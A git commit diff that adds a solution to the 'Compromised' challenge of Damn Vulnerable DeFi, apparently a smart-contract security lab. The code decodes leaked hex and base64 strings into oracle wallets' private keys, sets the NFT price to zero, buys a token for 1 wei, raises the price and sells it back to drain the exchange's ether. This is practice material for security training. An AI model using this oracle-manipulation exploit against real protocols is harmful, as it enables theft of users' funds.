0fc053c4e1096fc088b6ce612213ed3d61d6084a
Alexey <lxg1992@gmail.com>
2023-04-17 22:11:57 -0400

    Compromised solved

--- Week12/dvdf/test/Compromised.js
+++ Week12/dvdf/test/Compromised.js
@@ -8,8 +8,8 @@ describe("Compromised challenge", function () {
 
   const sources = [
     "0xA73209FB1a42495120166736362A1DfA9F95A105",
-    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
-    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
+    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15", // wallet1
+    "0x81A5D6E50C214044bE44cA0CB057fe119097850c", // wallet2
   ];
 
   const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
@@ -67,6 +67,45 @@ describe("Compromised challenge", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    const streams = [
+      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
+      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34",
+    ];
+
+    const privateKeys = streams.map((stream) => {
+      const b64 = Buffer.from(stream.split(" ").join(""), "hex").toString(
+        "utf8"
+      );
+      const hex = Buffer.from(b64, "base64").toString("utf8");
+      return hex;
+    });
+
+    const wallet1 = new ethers.Wallet(privateKeys[0], ethers.provider);
+    const wallet2 = new ethers.Wallet(privateKeys[1], ethers.provider);
+
+    console.log(wallet1.address);
+    console.log(wallet2.address);
+
+    const symbol = await nftToken.symbol();
+
+    // Set price to 0
+    const p1 = oracle.connect(wallet1).postPrice(symbol, 0);
+    const p2 = oracle.connect(wallet2).postPrice(symbol, 0);
+
+    await Promise.all([p1, p2]);
+
+    await exchange.connect(player).buyOne({ value: 1 }); //Mint one NFT with 1 wei
+
+    await oracle
+      .connect(wallet1)
+      .postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+    await oracle
+      .connect(wallet2)
+      .postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+
+    await nftToken.connect(player).approve(exchange.address, 0); //Approve exchange to manipulate NFT
+
+    await exchange.connect(player).sellOne(0); //tokenId 0
   });
 
   after(async function () {
